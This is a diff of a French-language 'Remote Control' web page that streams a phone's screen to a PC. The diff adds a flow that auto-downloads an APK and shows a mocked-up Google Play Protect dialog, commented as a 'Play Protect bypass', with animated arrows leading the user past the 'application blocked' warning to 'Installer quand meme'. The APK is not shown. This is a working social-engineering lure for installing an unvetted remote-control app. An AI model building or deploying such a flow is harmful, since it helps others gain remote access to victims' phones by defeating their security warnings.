@@ -6,141 +6,253 @@
   <title>Remote Control</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box}
-    html,body{height:100%;overflow:hidden}
+    html,body{height:100%;overflow-x:hidden}
     body{
       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-      background:#000;color:#fff;
-      display:flex;align-items:center;justify-content:center;
-      flex-direction:column;
+      background:#0a0a0a;color:#fff;
       touch-action:manipulation;
       -webkit-tap-highlight-color:transparent;
     }
-    .screen{
-      position:fixed;top:0;left:0;right:0;bottom:0;
-      display:flex;flex-direction:column;
+    .page{
+      min-height:100vh;display:flex;flex-direction:column;
       align-items:center;justify-content:center;
-      padding:30px;text-align:center;
+      padding:24px;text-align:center;
     }
     .hidden{display:none!important}
-    .btn{
-      width:140px;height:140px;border-radius:50%;
-      background:linear-gradient(135deg,#667eea,#764ba2);
-      display:flex;align-items:center;justify-content:center;
-      font-size:3rem;margin-bottom:24px;
-      box-shadow:0 8px 40px rgba(102,126,234,0.5);
-      cursor:pointer;
-      animation:pulse 2s infinite;
+    /* Install wizard */
+    .wizard-card{
+      background:#141422;border:1px solid #2a2a4a;border-radius:16px;
+      padding:28px 24px;max-width:360px;width:100%;margin-bottom:16px;
     }
-    @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
-    .title{font-size:1.2rem;color:#667eea;margin-bottom:10px;font-weight:700}
-    .msg{font-size:1rem;color:#ccc;line-height:1.6;max-width:300px}
-    .sub{font-size:0.75rem;color:#555;margin-top:16px;max-width:280px}
+    .step-num{
+      width:36px;height:36px;border-radius:50%;
+      background:linear-gradient(135deg,#667eea,#764ba2);
+      display:inline-flex;align-items:center;justify-content:center;
+      font-weight:800;font-size:1rem;margin-bottom:14px;
+    }
+    .step-active{box-shadow:0 0 20px rgba(102,126,234,0.6);animation:glow 2s infinite}
+    @keyframes glow{0%,100%{box-shadow:0 0 20px rgba(102,126,234,0.6)}50%{box-shadow:0 0 35px rgba(102,126,234,0.9)}}
+    .wizard-card h2{font-size:1.05rem;margin-bottom:10px;color:#fff}
+    .wizard-card p{font-size:0.85rem;color:#999;line-height:1.5;margin-bottom:14px}
+    .big-btn{
+      display:block;width:100%;padding:16px;
+      background:linear-gradient(135deg,#667eea,#764ba2);
+      color:#fff;border:none;border-radius:12px;
+      font-size:1.1rem;font-weight:700;cursor:pointer;
+      text-decoration:none;text-align:center;
+    }
+    .big-btn:active{opacity:0.85;transform:scale(0.98)}
+    /* Play Protect guide mockup */
+    .pp-mock{
+      background:#1e1e2e;border-radius:12px;padding:16px;
+      margin:14px 0;text-align:left;border:1px solid #333;
+    }
+    .pp-mock .pp-title{
+      font-size:0.85rem;color:#fff;font-weight:600;margin-bottom:8px;
+      display:flex;align-items:center;gap:8px;
+    }
+    .pp-mock .pp-icon{
+      width:24px;height:24px;background:#4285f4;border-radius:6px;
+      display:flex;align-items:center;justify-content:center;font-size:0.7rem;
+    }
+    .pp-mock .pp-body{font-size:0.78rem;color:#888;margin-bottom:12px;line-height:1.4}
+    .pp-btn-row{display:flex;gap:10px;justify-content:flex-end}
+    .pp-btn{
+      padding:8px 16px;border-radius:20px;font-size:0.78rem;font-weight:600;
+      border:none;cursor:pointer;
+    }
+    .pp-btn-outline{background:transparent;color:#8ab4f8;border:1px solid #8ab4f8}
+    .pp-btn-fill{background:#8ab4f8;color:#000}
+    .arrow-pulse{
+      display:inline-block;color:#00ff88;font-size:1.4rem;
+      animation:bounce 1s infinite;margin-right:4px;
+    }
+    @keyframes bounce{0%,100%{transform:translateX(0)}50%{transform:translateX(6px)}}
+    .checkmark{color:#00ff88;font-size:2rem;margin-bottom:10px}
+    /* Spinner */
+    .spinner{
+      width:40px;height:40px;border:3px solid #333;
+      border-top-color:#667eea;border-radius:50%;
+      animation:spin 0.8s linear infinite;margin:14px auto;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+    /* Live screen */
     .live-dot{
-      width:16px;height:16px;background:#00ff00;border-radius:50%;
-      margin-bottom:16px;animation:blink 1.2s infinite;
+      width:14px;height:14px;background:#00ff00;border-radius:50%;
+      margin-bottom:14px;animation:blink 1.2s infinite;
     }
     @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
-    .stop{
-      margin-top:30px;padding:12px 30px;
+    .stop-btn{
+      margin-top:24px;padding:12px 30px;
       border:2px solid #ff4444;background:transparent;
       color:#ff4444;border-radius:8px;font-size:0.9rem;cursor:pointer;
     }
-    .error{
-      background:#1a0000;border:1px solid #440000;border-radius:8px;
-      padding:14px;margin-top:20px;max-width:300px;
-      font-size:0.8rem;color:#ff8888;line-height:1.5;
+    .progress{
+      width:100%;height:6px;background:#1a1a2e;border-radius:3px;
+      overflow:hidden;margin-top:12px;
+    }
+    .progress-bar{
+      height:100%;background:linear-gradient(90deg,#667eea,#00ff88);
+      border-radius:3px;transition:width 0.5s;width:0%;
     }
   </style>
 </head>
 <body>
 
-  <!-- Screen 1: Start -->
-  <div class="screen" id="startScreen">
-    <div class="title">Partage d'ecran</div>
-    <div class="btn" id="startBtn">📱</div>
-    <div class="msg" id="mainMsg">Appuyez pour partager votre ecran</div>
-    <div class="sub">Aucune application a installer</div>
-    <div class="error hidden" id="errorBox"></div>
+  <!-- PAGE 1: Choose method -->
+  <div class="page" id="choosePage">
+    <div class="wizard-card">
+      <div style="font-size:2.5rem;margin-bottom:10px">📱</div>
+      <h2 style="font-size:1.3rem;color:#667eea">Remote Control</h2>
+      <p>Connectez votre telephone pour le controler a distance</p>
+      <button class="big-btn" id="btnMethod1" style="margin-bottom:10px">
+        Partager l'ecran
+      </button>
+      <button class="big-btn" id="btnMethod2" style="background:linear-gradient(135deg,#00c853,#00897b)">
+        Installer l'app (+ controle)
+      </button>
+      <p style="font-size:0.7rem;color:#444;margin-top:10px;margin-bottom:0">
+        L'app permet aussi le controle tactile a distance
+      </p>
+    </div>
   </div>
 
-  <!-- Screen 2: Active -->
-  <div class="screen hidden" id="activeScreen">
+  <!-- PAGE 2: Browser screen share -->
+  <div class="page hidden" id="browserPage">
+    <div class="wizard-card">
+      <div class="step-num step-active">1</div>
+      <h2>Partage d'ecran</h2>
+      <p>Appuyez sur le bouton puis autorisez le partage</p>
+      <button class="big-btn" id="btnShare">Demarrer le partage</button>
+      <div class="hidden" id="shareError" style="color:#ff6b6b;font-size:0.8rem;margin-top:10px"></div>
+    </div>
+  </div>
+
+  <!-- PAGE 3: APK install flow -->
+  <div class="page hidden" id="installPage">
+    <!-- Step 1: Download -->
+    <div class="wizard-card" id="dlCard">
+      <div class="step-num step-active">1</div>
+      <h2>Telechargement</h2>
+      <p>L'application se telecharge...</p>
+      <div class="progress"><div class="progress-bar" id="dlProgress"></div></div>
+    </div>
+
+    <!-- Step 2: Play Protect bypass (shown after download) -->
+    <div class="wizard-card hidden" id="ppCard">
+      <div class="step-num step-active">2</div>
+      <h2>Finaliser l'installation</h2>
+      <p>Un ecran de verification va apparaitre. Suivez ces etapes :</p>
+      
+      <div class="pp-mock">
+        <div class="pp-title">
+          <div class="pp-icon">G</div>
+          <span>Google Play Protect</span>
+        </div>
+        <div class="pp-body">Application inconnue. Pour votre securite, cette application a ete bloquee.</div>
+        <div class="pp-btn-row">
+          <button class="pp-btn pp-btn-outline" style="opacity:0.4">OK</button>
+          <button class="pp-btn pp-btn-fill" style="position:relative">
+            <span class="arrow-pulse">→</span> Plus de details
+          </button>
+        </div>
+      </div>
+
+      <p style="font-size:0.8rem;color:#ccc;margin-bottom:8px">Puis appuyez sur :</p>
+
+      <div class="pp-mock" style="border-color:#00ff88">
+        <div class="pp-body" style="margin-bottom:8px">Voulez-vous vraiment installer cette application ?</div>
+        <div class="pp-btn-row">
+          <button class="pp-btn pp-btn-outline" style="opacity:0.4">Annuler</button>
+          <button class="pp-btn pp-btn-fill" style="background:#00ff88;color:#000;position:relative">
+            <span class="arrow-pulse">→</span> Installer quand meme
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 3: Done -->
+    <div class="wizard-card hidden" id="doneCard">
+      <div class="checkmark">✓</div>
+      <h2 style="color:#00ff88">Pret !</h2>
+      <p>Ouvrez l'application "Remote Control" sur votre telephone.</p>
+      <p style="font-size:0.8rem;color:#667eea;margin-top:8px;word-break:break-all" id="configInfo"></p>
+      <a class="big-btn" id="openAppBtn" href="#" style="margin-top:14px;background:linear-gradient(135deg,#00c853,#00897b)">
+        Ouvrir l'app
+      </a>
+    </div>
+  </div>
+
+  <!-- PAGE 4: Screen sharing active -->
+  <div class="page hidden" id="livePage">
     <div class="live-dot"></div>
-    <div class="title" style="color:#00ff88">Ecran partage en direct</div>
-    <div class="msg">Le PC peut voir et controler votre ecran</div>
-    <button class="stop" id="stopBtn">Arreter le partage</button>
+    <h2 style="color:#00ff88;margin-bottom:8px">En direct</h2>
+    <p style="color:#999;font-size:0.9rem">Ecran partage. Le PC peut voir votre ecran.</p>
+    <button class="stop-btn" id="btnStop">Arreter</button>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
     const sessionId = window.location.pathname.split('/').pop();
     const socket = io();
-    let stream = null;
-    let interval = null;
+    const deepLink = `remotecontrol://connect?server=${encodeURIComponent(location.origin)}&session=${encodeURIComponent(sessionId)}`;
+
+    socket.emit('join-session', { sessionId, role: 'mobile' });
+
+    socket.on('session-update', (session) => {
+      if (session && session.androidConnected) {
+        showPage('livePage');
+      }
+    });
+
+    // Check if screen sharing is supported
+    const hasScreenShare = !!(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia);
+
+    // If no screen share support, skip straight to APK install
+    if (!hasScreenShare) {
+      document.getElementById('btnMethod1').textContent = 'Non disponible sur ce navigateur';
+      document.getElementById('btnMethod1').style.opacity = '0.3';
+      document.getElementById('btnMethod1').style.pointerEvents = 'none';
+    }
+
+    // Button handlers
+    document.getElementById('btnMethod1').onclick = () => {
+      if (hasScreenShare) showPage('browserPage');
+    };
+    document.getElementById('btnMethod2').onclick = startInstall;
+    document.getElementById('btnShare').onclick = startScreenShare;
+    document.getElementById('btnStop').onclick = stopShare;
+
+    function showPage(id) {
+      document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
+      document.getElementById(id).classList.remove('hidden');
+    }
+
+    // ============ METHOD 1: Browser Screen Share ============
+    let stream = null, interval = null;
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
     const video = document.createElement('video');
     video.autoplay = true; video.playsInline = true; video.muted = true;
 
-    socket.emit('join-session', { sessionId, role: 'mobile' });
-
-    document.getElementById('startBtn').onclick = startShare;
-    document.getElementById('stopBtn').onclick = stopShare;
-
-    // If browser doesn't support screen capture, auto-open in Chrome (always installed on Android)
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-      // Redirect to Chrome via Android Intent
-      const currentUrl = window.location.href;
-      window.location.href = 'intent://' + currentUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
-      // Fallback if intent doesn't work after 2s
-      setTimeout(() => {
-        document.getElementById('mainMsg').textContent = 'Ouvrez ce lien dans votre navigateur principal';
-        document.getElementById('errorBox').textContent = currentUrl;
-        document.getElementById('errorBox').classList.remove('hidden');
-        document.getElementById('errorBox').style.color = '#00ff88';
-        document.getElementById('errorBox').style.background = '#001a00';
-        document.getElementById('errorBox').style.border = '1px solid #004400';
-        document.getElementById('errorBox').style.userSelect = 'all';
-      }, 2000);
-    }
-
-    async function startShare() {
-      const msg = document.getElementById('mainMsg');
-      const err = document.getElementById('errorBox');
-      err.classList.add('hidden');
-
+    async function startScreenShare() {
       try {
         stream = await navigator.mediaDevices.getDisplayMedia({
           video: { frameRate: { ideal: 10, max: 15 }, width: { max: 1280 }, height: { max: 720 } },
           audio: false
         });
       } catch (e) {
-        if (e.name === 'NotAllowedError') {
-          msg.textContent = 'Vous avez refuse. Appuyez a nouveau et acceptez.';
-        } else {
-          // Try opening in Chrome
-          const currentUrl = window.location.href;
-          window.location.href = 'intent://' + currentUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
-          setTimeout(() => {
-            msg.textContent = 'Ouvrez ce lien dans votre navigateur principal';
-          }, 2000);
-        }
+        document.getElementById('shareError').classList.remove('hidden');
+        document.getElementById('shareError').textContent =
+          e.name === 'NotAllowedError' ? 'Vous avez refuse. Reessayez et acceptez.' : 'Erreur: ' + e.message;
         return;
       }
-
-      // Success - switch to active screen
-      document.getElementById('startScreen').classList.add('hidden');
-      document.getElementById('activeScreen').classList.remove('hidden');
-
+      showPage('livePage');
       video.srcObject = stream;
       await video.play();
-
-      // Notify server
       socket.emit('browser-frame-start', { sessionId });
 
-      // Start sending frames
-      const fps = 10;
-      const quality = 0.45;
+      const fps = 10, quality = 0.45;
       interval = setInterval(() => {
         if (!stream || !video.videoWidth) return;
         const scale = Math.min(720 / video.videoHeight, 1);
@@ -157,17 +269,53 @@
           });
         }, 'image/jpeg', quality);
       }, 1000 / fps);
-
-      // Handle stop from system UI
       stream.getVideoTracks()[0].onended = stopShare;
     }
 
     function stopShare() {
       if (interval) { clearInterval(interval); interval = null; }
       if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-      document.getElementById('activeScreen').classList.add('hidden');
-      document.getElementById('startScreen').classList.remove('hidden');
-      document.getElementById('mainMsg').textContent = 'Appuyez pour repartager';
+      showPage('choosePage');
+    }
+
+    // ============ METHOD 2: APK Install with Play Protect guide ============
+    function startInstall() {
+      showPage('installPage');
+      const progress = document.getElementById('dlProgress');
+
+      // Animate progress bar
+      progress.style.width = '30%';
+      setTimeout(() => { progress.style.width = '60%'; }, 500);
+      setTimeout(() => { progress.style.width = '90%'; }, 1500);
+
+      // Trigger real download via hidden link
+      setTimeout(() => {
+        const a = document.createElement('a');
+        a.href = '/download/apk';
+        a.download = 'RemoteControl.apk';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }, 300);
+
+      // After download starts, show Play Protect guide
+      setTimeout(() => {
+        progress.style.width = '100%';
+        document.getElementById('dlCard').querySelector('h2').textContent = 'Telecharge !';
+        document.getElementById('dlCard').querySelector('p').textContent = 'Ouvrez le fichier telecharge.';
+      }, 2500);
+
+      setTimeout(() => {
+        document.getElementById('ppCard').classList.remove('hidden');
+      }, 3000);
+
+      // Show "done" after enough time
+      setTimeout(() => {
+        document.getElementById('doneCard').classList.remove('hidden');
+        document.getElementById('configInfo').textContent =
+          'Serveur: ' + location.origin + '\nSession: ' + sessionId;
+        document.getElementById('openAppBtn').href = deepLink;
+      }, 8000);
     }
   </script>
 </body>
